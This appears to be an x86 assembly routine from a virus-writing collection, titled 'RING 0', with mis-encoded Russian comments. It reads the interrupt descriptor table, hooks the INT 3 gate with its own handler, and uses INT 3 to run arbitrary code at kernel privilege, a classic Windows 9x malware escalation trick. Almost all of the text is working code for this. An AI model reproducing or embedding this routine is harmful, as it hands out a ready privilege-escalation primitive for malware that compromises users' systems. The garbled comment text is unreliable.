   ;
   ;            ÛÛÛÛÛÛ¿   ÛÛ¿  ÛÛÛ¿ ÛÛ¿  ÛÛÛÛÛÛ¿     ÛÛÛÛÛ¿
   ;            ²²ÚÄÄ²²¿  ²²³  ²²²²¿²²³ ²²ÚÄÄÄÄÙ    ²²ÚÄÄ²²¿
   ;            ±±±±±±ÚÙ  ±±³  ±±Ú±±±±³ ±±³ ±±±¿    ±±³±¿±±³
   ;            °°Ú°°ÚÙ   °°³  °°³À°°°³ °°³ À°°³    °°³ÀÙ°°³
   ;            °°³À°°¿   °°³  °°³ À°°³ À°°°°°°³    À°°°°°ÚÙ
   ;            ÀÄÙ ÀÄÙ   ÀÄÙ  ÀÄÙ  ÀÄÙ  ÀÄÄÄÄÄÙ     ÀÄÄÄÄÙ
   ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   open_RING0_function:
           pushad
           call     init_open_RING0_function
   init_open_RING0_function:
           pop      ebp
           sub      ebp,offset (init_open_RING0_function-open_RING0_function)
           sub      esp,4
           sidt     fword ptr [esp-02]
           ;‹¨¥©ë©  ¤p¥áá IDT
           pop      ebx
           add      ebx,3*8h
           cli
           ;*¥p¥¬ áâ pë© ®¡p ¡®âç¨ª ¯p¥pë¢ ¨ï INT 3
           mov      edi,[ebx+4]
           mov      di,[ebx]
           ;H è ®¡p ¡®âç¨ª INT 3
           lea      esi,[ebp+obr_INT3-open_RING0_function]
           mov      [ebx],si     ;*¥p¢ ï ¯®«®¢¨  á¬¥é¥¨ï ®¡p ¡®âç¨ª  INT3
           shr      esi,10h
           mov      [ebx+06],si  ;‚â®p ï ¯®«®¢¨  á¬¥é¥¨ï ®¡p ¡®âç¨ª  INT3
           ;‚å®¤: EDI - áâ pë© ®¡p ¡®âç¨ª
           ;      EBX - «¨¥©ë©  ¤p¥áá ¤¥áªp¨¯â®p  INT 3
           mov      ax,01h
           int      3h
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;’¥ªãé¨¥ äãªæ¨¨:
   ;AX = 1 - ˆ¨æ¨ «¨§ æ¨ï RING0_function
   ;‚å®¤: EDI - áâ pë© ®¡p ¡®âç¨ª
   ;      EBX - «¨¥©ë©  ¤p¥áá ¤¥áªp¨¯â®p  INT 3
   ;AX = 2 - “¡p âì ®¡p ¡®âç¨ª äãªæ¨© RING3 (¯p¨ ¢ëå®¤¥)
   ;AX = 3 - ‚ë¯®«¨âì ¯®¤¯p®£p ¬¬ã ª ª § ¤ çã RING 0
   ;‚å®¤: EDI - á¬¥é¥¨¥ ¯®¤¯p®£p ¬¬ë
   obr_INT3:
           push     ebp
           call     init_obr_INT3
   init_obr_INT3:
           pop      ebp
           sub      ebp,offset (init_obr_INT3-obr_INT3)
           ;‘¤¥áì ¬®¦® ®¯p¥¤¥«¨âì á¢®¨ äãªæ¨¨ RING0
           cmp      ax,01h ;ˆ¨æ¨ «¨§ æ¨ï äãªæ¨© RING0 (¥ ¨á¯®«ì§®¢ âì)
           jz       init_RING0_function
           cmp      ax,02h ;Remove RING 0 äãªæ¨©
           jz       remove_RING0_function
           cmp      ax,03h
           jz       call_RING0
   function_complite:
           pop      ebp
   function_complite_without_popebp:
           iretd
   init_RING0_function:
           mov      dword ptr [ebp+old_IN3_base_addr-obr_INT3],edi
           mov      dword ptr [ebp+IDT_base_addr-obr_INT3],ebx
           jmp      function_complite
   remove_RING0_function:
           push     ebx esi
           mov      ebx,dword ptr [ebp+IDT_base_addr-obr_INT3]
           mov      esi,dword ptr [ebp+old_IN3_base_addr-obr_INT3]
           mov      [ebx],si
           shr      esi,10h
           mov      [ebx+06],si
           pop      esi ebx
           jmp      function_complite
   call_RING0:
           pop      ebp
           call     edi
           jmp      function_complite_without_popebp
   old_IN3_base_addr dd 0
   IDT_base_addr     dd 0
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
